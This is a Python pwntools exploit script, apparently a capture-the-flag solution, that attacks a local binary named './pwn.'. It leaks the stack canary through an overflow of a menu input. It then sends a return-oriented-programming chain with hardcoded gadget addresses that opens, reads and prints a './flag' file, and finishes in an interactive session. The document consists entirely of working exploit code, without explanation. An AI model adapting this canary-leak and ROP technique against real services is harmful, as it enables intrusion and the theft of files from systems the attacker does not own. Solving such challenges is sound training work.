from pwn import *
#context.log_level = 'debug'


p = process('./pwn.')
elf = ELF('./pwn.')

def stack(payload):
	p.sendlineafter('option:','1')
	p.sendafter('once..\n',payload)

def secret(payload):
	p.sendlineafter('option:','9011')
	p.sendafter('code:',payload)

def fsb(payload):
	p.sendlineafter('option:','3')
	p.sendafter('think?)\n',payload)

def bored(payload,choice = 'n'):
	p.sendafter('bored...\n',payload)
	p.sendafter('y/n\n',choice)


#leak canary
p.sendlineafter('option:','2')
for i in range(4):
	bored('a')
bored('a','y')


stack('a'*0xa8 + 'a')
p.recv(0xa9)
canary = u64(p.recv(7).rjust(8,'\x00'))
log.success('canary : 0x%x' %canary)

#open('./flag',0) --> read(0,0x602068,0x200) --> puts(0x602068)
open_plt = elf.plt['open']
read_plt = elf.plt['read']
puts_plt = elf.plt['puts']
pop_rdi = 0x0000000000400c53
pop_rsi_r15 = 0x0000000000400c51

payload = './flag\0\0' + p64(canary) + 'a'*0x8
payload += p64(pop_rdi) + p64(0x602080) + p64(pop_rsi_r15) + p64(0) + p64(0)
payload += p64(open_plt) + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(0x602068) + p64(0)
payload += p64(read_plt) + p64(pop_rdi) + p64(0x602068) + p64(puts_plt) 

p.sendlineafter('option:','2')
bored(payload,'y')
#gdb.attach(p)
try:
	for i in range(9999):
		secret('\0')

except Exception as e:
	p.close()


p.interactive()
